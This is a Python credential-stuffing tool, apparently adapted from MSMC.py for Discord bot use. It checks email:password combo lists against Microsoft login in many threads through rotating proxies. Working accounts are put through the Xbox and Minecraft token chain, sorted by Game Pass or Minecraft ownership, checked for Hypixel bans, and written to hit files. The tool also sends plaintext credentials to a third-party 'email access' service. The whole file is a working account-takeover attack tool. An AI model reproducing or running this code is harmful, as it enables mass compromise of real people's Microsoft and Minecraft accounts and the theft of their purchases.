#!/usr/bin/env python3
"""
Microsoft Account Checker
Discord Integration Version

Modified from MSMC.py script for Discord bot integration
"""
import requests
import re
import os
import time
import threading
import random
import urllib3
import configparser
import json
import concurrent.futures
import warnings
import uuid
import socket
import sys
import argparse
import socks
from datetime import datetime, timezone
from colorama import Fore
from urllib.parse import urlparse, parse_qs
from io import StringIO

# For ban checking
try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    from minecraft.exceptions import LoginDisconnect
    minecraft_available = True
except ImportError:
    minecraft_available = False
    print("Minecraft package not available - ban checking will be disabled")

# Disable warnings for unverified HTTPS requests
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# Constants
MS_LOGIN_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

# Global variables for stats
hits = 0
bad = 0
twofa = 0
cpm = 0
errors = 0
retries = 0
checked = 0
valid_mail = 0
sfa = 0
mfa = 0
xbox_gp = 0
xbox_gpu = 0
other = 0
max_retries = 3  # Default, can be overridden by config

# Global data lists
accounts = []
proxy_list = []
ban_proxies = []

# Directories
base_dir = '.'
microsoft_dir = os.path.join(base_dir, 'microsoft')
temp_dir = os.path.join(base_dir, 'temp')
results_dir = os.path.join(base_dir, 'results')

# Config class for settings
class Config:
    def __init__(self):
        self.data = {}

    def set(self, key, value):
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)

config = Config()

def debug_print(message):
    """Print debug messages with timestamp"""
    timestamp = datetime.now().strftime('[%Y-%m-%d %H:%M:%S.%f')[:-3] + ']'
    print(f"{timestamp} {message}")

def setup_directories():
    """Setup all required directories"""
    for directory in [microsoft_dir, temp_dir, results_dir]:
        if not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)
            debug_print(f"Created directory: {directory}")

def print_banner():
    """Print the Microsoft account checker banner"""
    banner = Fore.GREEN+'''
     ███▄ ▄███▓  ██████  ███▄ ▄███▓ ▄████▄  
    ▓██▒▀█▀ ██▒▒██    ▒ ▓██▒▀█▀ ██▒▒██▀ ▀█  
    ▓██    ▓██░░ ▓██▄   ▓██    ▓██░▒▓█    ▄ 
    ▒██    ▒██   ▒   ██▒▒██    ▒██ ▒▓▓▄ ▄██▒
    ▒██▒   ░██▒▒██████▒▒▒██▒   ░██▒▒ ▓███▀ ░
    ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░ ░▒ ▒  ░
    ░  ░      ░░ ░▒  ░ ░░  ░      ░  ░  ▒   
    ░      ░   ░  ░  ░  ░      ░   ░        
           ░         ░         ░   ░ ░      
                                   ░        
    Microsoft Account Checker - Discord Edition
    '''
    print(banner)

class Capture:
    def __init__(self, email, password, name, capes, uuid, token, type):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid
        self.token = token
        self.type = type
        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None

    def builder(self):
        message = f"Email: {self.email}\nPassword: {self.password}\nName: {self.name}\nCapes: {self.capes}\nAccount Type: {self.type}"
        if self.hypixl is not None: message+=f"\nHypixel: {self.hypixl}"
        if self.level is not None: message+=f"\nHypixel Level: {self.level}"
        if self.firstlogin is not None: message+=f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin is not None: message+=f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape is not None: message+=f"\nOptifine Cape: {self.cape}"
        if self.access is not None: message+=f"\nEmail Access: {self.access}"
        if self.sbcoins is not None: message+=f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars is not None: message+=f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get('hypixelban') is True: message+=f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged is not None: message+=f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged is not None: message+=f"\nLast Name Change: {self.lastchanged}"
        return message+"\n============================\n"

    def hypixel(self):
        global errors
        try:
            if config.get('hypixelname') is True or config.get('hypixellevel') is True or config.get('hypixelfirstlogin') is True or config.get('hypixellastlogin') is True or config.get('hypixelbwstars') is True:
                tx = requests.get('https://plancke.io/hypixel/player/stats/'+self.name, proxies=get_proxy(), headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'}, verify=False).text
                try: 
                    if config.get('hypixelname') is True: self.hypixl = re.search('(?<=content=\"Plancke\" /><meta property=\"og:locale\" content=\"en_US\" /><meta property=\"og:description\" content=\").+?(?=\")', tx).group()
                except: pass
                try: 
                    if config.get('hypixellevel') is True: self.level = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelfirstlogin') is True: self.firstlogin = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixellastlogin') is True: self.lastlogin = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
                except: pass
                try: 
                    if config.get('hypixelbwstars') is True: self.bwstars = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
                except: pass
            if config.get('hypixelsbcoins') is True:
                try:
                    req = requests.get("https://sky.shiiyu.moe/stats/"+self.name, proxies=get_proxy(), verify=False)
                    self.sbcoins = re.search('(?<= Networth: ).+?(?=\n)', req.text).group()
                except: pass
        except: errors+=1

    def optifine(self):
        if config.get('optifinecape') is True:
            try:
                txt = requests.get(f'http://s.optifine.net/capes/{self.name}.png', proxies=get_proxy(), verify=False).text
                if "Not found" in txt: self.cape = "No"
                else: self.cape = "Yes"
            except: self.cape = "Unknown"

    def full_access(self):
        global mfa, sfa
        if config.get('access') is True:
            try:
                out = json.loads(requests.get(f"https://email.avine.tools/check?email={self.email}&password={self.password}", verify=False).text)
                if out["Success"] == 1: 
                    self.access = "True"
                    mfa+=1
                    with open(os.path.join(results_dir, 'MFA.txt'), 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")
                else:
                    sfa+=1
                    self.access = "False"
                    with open(os.path.join(results_dir, 'SFA.txt'), 'a') as f:
                        f.write(f"{self.email}:{self.password}\n")
            except: self.access = "Unknown"
    
    def namechange(self):
        global retries
        if config.get('namechange') is True or config.get('lastchanged') is True:
            tries = 0
            while tries < max_retries:
                try:
                    check = requests.get('https://api.minecraftservices.com/minecraft/profile/namechange', 
                                         headers={'Authorization': f'Bearer {self.token}'}, 
                                         proxies=get_proxy(), verify=False)
                    if check.status_code == 200:
                        try:
                            data = check.json()
                            if config.get('namechange') is True:
                                self.namechanged = str(data.get('nameChangeAllowed', 'N/A'))
                            if config.get('lastchanged') is True:
                                created_at = data.get('createdAt')
                                if created_at:
                                    try:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                    except ValueError:
                                        given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                    given_date = given_date.replace(tzinfo=timezone.utc)
                                    formatted = given_date.strftime("%m/%d/%Y")
                                    current_date = datetime.now(timezone.utc)
                                    difference = current_date - given_date
                                    years = difference.days // 365
                                    months = (difference.days % 365) // 30
                                    days = difference.days

                                    if years > 0:
                                        self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                    elif months > 0:
                                        self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                    else:
                                        self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                    break
                        except: pass
                    if check.status_code == 429:
                        if len(proxy_list) < 5: time.sleep(20)
                        self.namechange()
                except: pass
                tries += 1
                retries += 1
    
    def ban(self):
        global errors
        if not minecraft_available:
            self.banned = "Ban check unavailable - minecraft package not installed"
            return
            
        if config.get('hypixelban') is True:
            auth_token = AuthenticationToken(username=self.name, access_token=self.token, client_token=uuid.uuid4().hex)
            auth_token.profile = Profile(id_=self.uuid, name=self.name)
            tries = 0
            while tries < max_retries:
                connection = Connection("alpha.hypixel.net", 25565, auth_token=auth_token, initial_version=47)
                
                @connection.listener(clientbound.login.DisconnectPacket, early=True)
                def login_disconnect(packet):
                    data = json.loads(str(packet.json_data))
                    if "Suspicious activity" in str(data):
                        self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(os.path.join(results_dir, 'Banned.txt'), 'a') as f:
                            f.write(f"{self.email}:{self.password}\n")
                    elif "temporarily banned" in str(data):
                        self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                        with open(os.path.join(results_dir, 'Banned.txt'), 'a') as f:
                            f.write(f"{self.email}:{self.password}\n")
                    elif "You are permanently banned from this server!" in str(data):
                        self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                        with open(os.path.join(results_dir, 'Banned.txt'), 'a') as f:
                            f.write(f"{self.email}:{self.password}\n")
                    elif "The Hypixel Alpha server is currently closed!" in str(data):
                        self.banned = "False"
                        with open(os.path.join(results_dir, 'Unbanned.txt'), 'a') as f:
                            f.write(f"{self.email}:{self.password}\n")
                    elif "Failed cloning your SkyBlock data" in str(data):
                        self.banned = "False"
                        with open(os.path.join(results_dir, 'Unbanned.txt'), 'a') as f:
                            f.write(f"{self.email}:{self.password}\n")
                    else:
                        self.banned = ''.join(item["text"] for item in data["extra"])
                        with open(os.path.join(results_dir, 'Banned.txt'), 'a') as f:
                            f.write(f"{self.email}:{self.password}\n")
                
                @connection.listener(clientbound.play.JoinGamePacket, early=True)
                def joined_server(packet):
                    if self.banned is None:
                        self.banned = "False"
                        with open(os.path.join(results_dir, 'Unbanned.txt'), 'a') as f:
                            f.write(f"{self.email}:{self.password}\n")
                
                try:
                    if len(ban_proxies) > 0:
                        proxy = random.choice(ban_proxies)
                        if '@' in proxy:
                            atsplit = proxy.split('@')
                            socks.set_default_proxy(socks.SOCKS5, addr=atsplit[1].split(':')[0], port=int(atsplit[1].split(':')[1]), username=atsplit[0].split(':')[0], password=atsplit[0].split(':')[1])
                        else:
                            ip_port = proxy.split(':')
                            socks.set_default_proxy(socks.SOCKS5, addr=ip_port[0], port=int(ip_port[1]))
                        socket.socket = socks.socksocket
                    
                    original_stderr = sys.stderr
                    sys.stderr = StringIO()
                    try: 
                        connection.connect()
                        c = 0
                        while self.banned is None or c < 1000:
                            time.sleep(.01)
                            c += 1
                        connection.disconnect()
                    except: pass
                    sys.stderr = original_stderr
                except: pass
                
                if self.banned is not None: break
                tries += 1

    def handle(self):
        global hits
        hits += 1
        debug_print(f"Hit: {self.name} | {self.email}:{self.password}")
        
        with open(os.path.join(results_dir, 'Hits.txt'), 'a') as file:
            file.write(f"{self.email}:{self.password}\n")
        
        if self.name != 'N/A':
            try: self.hypixel()
            except: pass
            try: self.optifine()
            except: pass
            try: self.full_access()
            except: pass
            try: self.namechange()
            except: pass
            try: self.ban()
            except: pass
        
        with open(os.path.join(results_dir, 'Capture.txt'), 'a') as f:
            f.write(self.builder())

def get_urlPost_sFTTag(session):
    global retries
    attempts = 0
    while attempts < max_retries:  # Limit retries to avoid infinite loops
        try:
            r = session.get(MS_LOGIN_URL, timeout=15)
            text = r.text
            match = re.match(r'.*value="(.+?)".*', text, re.S)
            if match is not None:
                sFTTag = match.group(1)
                match = re.match(r".*urlPost:'(.+?)'.*", text, re.S)
                if match is not None:
                    return match.group(1), sFTTag, session
        except: pass
        session.proxies = get_proxy()
        retries += 1
        attempts += 1
    
    # If we failed after max_retries, return empty values
    return None, None, session

def get_xbox_rps(session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries, checked
    tries = 0
    while tries < max_retries:
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
            login_request = session.post(
                urlPost, 
                data=data, 
                headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
                allow_redirects=True, 
                timeout=15
            )
            
            if '#' in login_request.url and login_request.url != MS_LOGIN_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif 'cancel?mkt=' in login_request.text:
                data = {
                    'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                    'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                    'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                }
                ret = session.post(
                    re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), 
                    data=data, 
                    allow_redirects=True
                )
                fin = session.get(
                    re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), 
                    allow_redirects=True
                )
                token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, session
            elif any(value in login_request.text for value in [
                "recover?mkt", "account.live.com/identity/confirm?mkt", 
                "Email/Confirm?mkt", "/Abuse?mkt="
            ]):
                twofa += 1
                checked += 1
                cpm += 1
                debug_print(f"2FA: {email}:{password}")
                with open(os.path.join(results_dir, '2fa.txt'), 'a') as file:
                    file.write(f"{email}:{password}\n")
                return "None", session
            elif any(value in login_request.text.lower() for value in [
                "password is incorrect", r"account doesn\'t exist.", 
                "sign in to your microsoft account", 
                "tried to sign in too many times with an incorrect account or password"
            ]):
                bad += 1
                checked += 1
                cpm += 1
                debug_print(f"Bad: {email}:{password}")
                return "None", session
            else:
                session.proxies = get_proxy()
                retries += 1
                tries += 1
        except:
            session.proxies = get_proxy()
            retries += 1
            tries += 1
    
    bad += 1
    checked += 1
    cpm += 1
    debug_print(f"Bad: {email}:{password}")
    return "None", session

def valid_mail(email, password):
    global valid_mail, cpm, checked
    valid_mail += 1
    cpm += 1
    checked += 1
    with open(os.path.join(results_dir, 'Valid_Mail.txt'), 'a') as file:
        file.write(f"{email}:{password}\n")
    debug_print(f"Valid Mail: {email}:{password}")

def capture_mc(access_token, session, email, password, type):
    global retries
    attempts = 0
    while attempts < max_retries:  # Limit retries to avoid infinite loops
        try:
            r = session.get(
                'https://api.minecraftservices.com/minecraft/profile', 
                headers={'Authorization': f'Bearer {access_token}'}, 
                verify=False
            )
            
            if r.status_code == 200:
                capes = ", ".join([cape["alias"] for cape in r.json().get("capes", [])])
                CAPTURE = Capture(email, password, r.json()['name'], capes, r.json()['id'], access_token, type)
                CAPTURE.handle()
                break
            elif r.status_code == 429:
                retries += 1
                session.proxies = get_proxy()
                if len(proxy_list) < 5: time.sleep(20)
                continue
            else: break
        except:
            retries += 1
            session.proxies = get_proxy()
            continue
        attempts += 1

def check_mc(session, email, password, token):
    global retries, cpm, checked, xbox_gp, xbox_gpu, other
    attempts = 0
    while attempts < max_retries:  # Limit retries to avoid infinite loops
        try:
            check_rq = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore', 
                headers={'Authorization': f'Bearer {token}'}, 
                verify=False
            )
            
            if check_rq.status_code == 200:
                if 'product_game_pass_ultimate' in check_rq.text:
                    xbox_gpu += 1
                    cpm += 1
                    checked += 1
                    debug_print(f"Xbox Game Pass Ultimate: {email}:{password}")
                    with open(os.path.join(results_dir, 'XboxGamePassUltimate.txt'), 'a') as f:
                        f.write(f"{email}:{password}\n")
                    try: 
                        capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                    except: 
                        CAPTURE = Capture(email, password, "N/A", "N/A", "N/A", "N/A", "Xbox Game Pass Ultimate [Unset MC]")
                        CAPTURE.handle()
                    return True
                elif 'product_game_pass_pc' in check_rq.text:
                    xbox_gp += 1
                    cpm += 1
                    checked += 1
                    debug_print(f"Xbox Game Pass: {email}:{password}")
                    with open(os.path.join(results_dir, 'XboxGamePass.txt'), 'a') as f:
                        f.write(f"{email}:{password}\n")
                    capture_mc(token, session, email, password, "Xbox Game Pass")
                    return True
                elif '"product_minecraft"' in check_rq.text:
                    checked += 1
                    cpm += 1
                    capture_mc(token, session, email, password, "Normal")
                    return True
                else:
                    others = []
                    if 'product_minecraft_bedrock' in check_rq.text:
                        others.append("Minecraft Bedrock")
                    if 'product_legends' in check_rq.text:
                        others.append("Minecraft Legends")
                    if 'product_dungeons' in check_rq.text:
                        others.append('Minecraft Dungeons')
                    
                    if others:
                        other += 1
                        cpm += 1
                        checked += 1
                        items = ', '.join(others)
                        with open(os.path.join(results_dir, 'Other.txt'), 'a') as f:
                            f.write(f"{email}:{password} | {items}\n")
                        debug_print(f"Other: {email}:{password} | {items}")
                        return True
                    else:
                        return False
            elif check_rq.status_code == 429:
                retries += 1
                session.proxies = get_proxy()
                if len(proxy_list) < 1: time.sleep(20)
                continue
            else:
                return False
        except:
            retries += 1
            attempts += 1
    
    return False

def mc_token(session, uhs, xsts_token):
    global retries
    attempts = 0
    while attempts < max_retries:  # Limit retries to avoid infinite loops
        try:
            mc_login = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox', 
                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, 
                headers={'Content-Type': 'application/json'}, 
                timeout=15
            )
            
            if mc_login.status_code == 429:
                session.proxies = get_proxy()
                if len(proxy_list) < 1: time.sleep(20)
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries += 1
            session.proxies = get_proxy()
            continue
        attempts += 1
    
    return None

def authenticate(email, password, tries=0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = get_proxy()
        
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        if not urlPost or not sFTTag:
            # Failed to get authentication URLs
            bad += 1
            checked += 1
            cpm += 1
            debug_print(f"Bad (Failed to get auth URL): {email}:{password}")
            return
            
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        
        if token != "None":
            hit = False
            try:
                xbox_login = session.post(
                    'https://user.auth.xboxlive.com/user/authenticate', 
                    json={
                        "Properties": {
                            "AuthMethod": "RPS", 
                            "SiteName": "user.auth.xboxlive.com", 
                            "RpsTicket": token
                        }, 
                        "RelyingParty": "http://auth.xboxlive.com", 
                        "TokenType": "JWT"
                    }, 
                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, 
                    timeout=15
                )
                
                js = xbox_login.json()
                xbox_token = js.get('Token')
                
                if xbox_token is not None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post(
                        'https://xsts.auth.xboxlive.com/xsts/authorize', 
                        json={
                            "Properties": {
                                "SandboxId": "RETAIL", 
                                "UserTokens": [xbox_token]
                            }, 
                            "RelyingParty": "rp://api.minecraftservices.com/", 
                            "TokenType": "JWT"
                        }, 
                        headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, 
                        timeout=15
                    )
                    
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    
                    if xsts_token is not None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token is not None:
                            hit = check_mc(session, email, password, access_token)
            except Exception as e:
                debug_print(f"Error during authentication: {e}")
                pass
                
            if hit is False:
                valid_mail(email, password)
    except Exception as e:
        debug_print(f"Authentication error: {e}")
        if tries < max_retries:
            tries += 1
            retries += 1
            authenticate(email, password, tries)
        else:
            bad += 1
            checked += 1
            cpm += 1
            debug_print(f"Bad: {email}:{password}")
    finally:
        session.close()

def load_accounts(file_path):
    """Load accounts from file"""
    global accounts
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            lines = file.readlines()
            accounts = list(set(lines))  # Remove duplicates
            debug_print(f"Loaded {len(accounts)} accounts from {file_path}")
            debug_print(f"Removed {len(lines) - len(accounts)} duplicate accounts")
    except Exception as e:
        debug_print(f"Error loading accounts: {e}")
        return False
    return True

def load_proxies(file_path):
    """Load proxies from file"""
    global proxy_list
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            lines = file.readlines()
            for line in lines:
                try:
                    proxy_line = line.strip()
                    if proxy_line:
                        proxy_list.append(proxy_line)
                except:
                    pass
            debug_print(f"Loaded {len(proxy_list)} proxies from {file_path}")
    except Exception as e:
        debug_print(f"Error loading proxies: {e}")
        return False
    return True

def get_proxy():
    """Get a random proxy from the list"""
    if not proxy_list:
        return None
    
    proxy = random.choice(proxy_list)
    # Format: http://proxy or http://user:pass@proxy
    if '@' in proxy:
        # proxy contains authentication
        auth, address = proxy.split('@')
        user, password = auth.split(':')
        host, port = address.split(':')
        return {
            'http': f'http://{user}:{password}@{host}:{port}',
            'https': f'https://{user}:{password}@{host}:{port}'
        }
    else:
        # simple proxy without auth
        return {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }

def check_account(combo):
    """Check a single account"""
    global bad, checked, cpm
    try:
        combo = combo.strip()
        if ':' not in combo:
            debug_print(f"Invalid format: {combo}")
            bad += 1
            checked += 1
            cpm += 1
            return
            
        email, password = combo.strip().replace(' ', '').split(":", 1)
        if email and password:
            authenticate(str(email), str(password))
        else:
            debug_print(f"Bad: {combo}")
            bad += 1
            cpm += 1
            checked += 1
    except Exception as e:
        debug_print(f"Error checking account: {e}")
        debug_print(f"Bad: {combo}")
        bad += 1
        cpm += 1
        checked += 1

def load_config():
    """Load configuration"""
    global max_retries, config
    
    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')
    
    # Create default config if it doesn't exist
    if not os.path.isfile("microsoft_config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        c['Settings'] = {
            'Max Retries': 3,
            'Proxyless Ban Check': False,
        }
        c['Captures'] = {
            'Hypixel Name': True,
            'Hypixel Level': True,
            'First Hypixel Login': True,
            'Last Hypixel Login': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Hypixel Skyblock Coins': True,
            'Hypixel Bedwars Stars': True,
            'Hypixel Ban': True,
            'Name Change Availability': True,
            'Last Name Change': True
        }
        
        with open('microsoft_config.ini', 'w') as configfile:
            c.write(configfile)
    
    # Read config
    read_config = configparser.ConfigParser()
    read_config.read('microsoft_config.ini')
    
    max_retries = int(read_config['Settings']['Max Retries'])
    config.set('proxylessban', str_to_bool(read_config['Settings']['Proxyless Ban Check']))
    config.set('hypixelname', str_to_bool(read_config['Captures']['Hypixel Name']))
    config.set('hypixellevel', str_to_bool(read_config['Captures']['Hypixel Level']))
    config.set('hypixelfirstlogin', str_to_bool(read_config['Captures']['First Hypixel Login']))
    config.set('hypixellastlogin', str_to_bool(read_config['Captures']['Last Hypixel Login']))
    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
    config.set('hypixelsbcoins', str_to_bool(read_config['Captures']['Hypixel Skyblock Coins']))
    config.set('hypixelbwstars', str_to_bool(read_config['Captures']['Hypixel Bedwars Stars']))
    config.set('hypixelban', str_to_bool(read_config['Captures']['Hypixel Ban']))
    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))

def print_statistics():
    """Print statistics of the Microsoft account checking process in a Discord-friendly format"""
    elapsed = time.time() - start_time
    success_rate = (hits / max(checked, 1)) * 100
    
    print("\nMICROSOFT ACCOUNT CHECK RESULTS")
    print("===========================")
    print(f"Total Hits: {hits}")
    print(f"Total Bad: {bad}")
    print(f"Total 2FA: {twofa}")
    print(f"Total Valid Mail: {valid_mail}")
    print(f"Total SFA: {sfa}")
    print(f"Total MFA: {mfa}")
    print(f"Xbox Game Pass: {xbox_gp}")
    print(f"Xbox Game Pass Ultimate: {xbox_gpu}")
    print(f"Other Products: {other}")
    print(f"Total Checked: {checked}")
    print(f"Success Rate: {success_rate:.2f}%")
    print(f"Time Elapsed: {elapsed:.2f} seconds")
    
    if elapsed > 0 and checked > 0:
        print(f"Processing Speed: {checked/elapsed:.2f} accounts/second")
    else:
        print("Processing Speed: 0.00 accounts/second")
    print("===========================")
    
    # Output specially formatted for Discord parsing
    print("DISCORD_STATS_BEGIN")
    print(f"[MS Account Checker] Hits: {hits}")
    print(f"Bad accounts: {bad}")
    print(f"2FA accounts: {twofa}")
    print(f"Valid mail accounts: {valid_mail}")
    print(f"SFA accounts: {sfa}")
    print(f"MFA accounts: {mfa}")
    print(f"Xbox Game Pass: {xbox_gp}")
    print(f"Xbox Game Pass Ultimate: {xbox_gpu}")
    print(f"Other products: {other}")
    print(f"Total checked: {checked}")
    print(f"Success rate: {success_rate:.2f}%")
    print(f"Processing time: {elapsed:.2f}s")
    
    if elapsed > 0 and checked > 0:
        print(f"Processing speed: {checked/elapsed:.2f} accounts/sec")
    else:
        print("Processing speed: 0.00 accounts/sec")
    print("[MS Account Checker] DISCORD_STATS_END")

def check_file(file_path, thread_count=None):
    """Check accounts from a file"""
    global accounts, start_time
    
    # Setup
    setup_directories()
    load_config()
    
    if not os.path.exists(os.path.join(results_dir, 'microsoft')): 
        os.makedirs(os.path.join(results_dir, 'microsoft'))
    
    # Load accounts
    if not load_accounts(file_path):
        return False
    
    if len(accounts) == 0:
        debug_print("No accounts loaded.")
        return False
    
    # Setup thread count
    if thread_count is None:
        thread_count = min(100, len(accounts))  # Default to 100 or less if fewer accounts
    else:
        thread_count = min(int(thread_count), len(accounts))
    
    debug_print(f"Starting Microsoft account check with {thread_count} threads")
    debug_print(f"Accounts to check: {len(accounts)}")
    
    # Record start time
    start_time = time.time()
    
    # Run the checker with multiple threads
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(check_account, combo) for combo in accounts]
        
        # Track progress
        total = len(futures)
        processed = 0
        
        # Wait for all futures to complete
        for _ in concurrent.futures.as_completed(futures):
            processed += 1
            
            # Print progress update every 5% or 10 accounts, whichever is more frequent
            if processed % max(1, min(total // 20, 10)) == 0 or processed == total:
                progress_pct = (processed / total) * 100
                elapsed = time.time() - start_time
                speed = processed / elapsed if elapsed > 0 else 0
                
                print(f"PROGRESS REPORT | Progress: {processed}/{total} | " 
                      f"Hits: {hits} | Bad: {bad} | 2FA: {twofa} | Speed: {speed:.2f}")
    
    # Print final statistics
    print_statistics()
    return True

def command_main():
    """Main function for command-line usage"""
    parser = argparse.ArgumentParser(description='Microsoft Account Checker')
    parser.add_argument('file', help='Path to the file containing accounts (email:password format)')
    parser.add_argument('--threads', type=int, default=100, help='Number of threads to use')
    parser.add_argument('--proxies', help='Path to the file containing proxies')
    parser.add_argument('--discord', action='store_true', help='Format output for Discord integration')
    
    args = parser.parse_args()
    
    # Setup
    print_banner()
    setup_directories()
    
    # Load proxies if provided
    if args.proxies:
        load_proxies(args.proxies)
    
    # Check accounts
    check_file(args.file, args.threads)

if __name__ == "__main__":
    command_main()